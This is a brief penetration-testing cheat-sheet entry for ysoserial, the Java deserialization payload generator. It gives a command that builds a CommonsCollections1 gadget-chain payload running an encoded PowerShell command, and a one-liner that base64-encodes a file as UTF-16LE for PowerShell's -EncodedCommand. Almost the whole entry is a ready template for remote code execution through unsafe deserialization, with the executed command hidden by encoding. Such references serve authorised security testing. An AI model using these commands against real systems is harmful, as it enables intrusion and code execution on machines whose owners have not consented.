# ysoserial

% ysoserial, ysoserial.net, java, .net, unserialize

## ysoserial java - generate payload
```
java -jar ysoserial.jar <lib_payload> 'powershell.exe -EncodedCommand <base64_encoded_command>' > <output_file>
```

## convert file to base64 one line
```
iconv -f ASCII -t UTF-16LE <file_to_convert> | base64 | tr -d "\n"
```

= lib_payload : CommonsCollections1
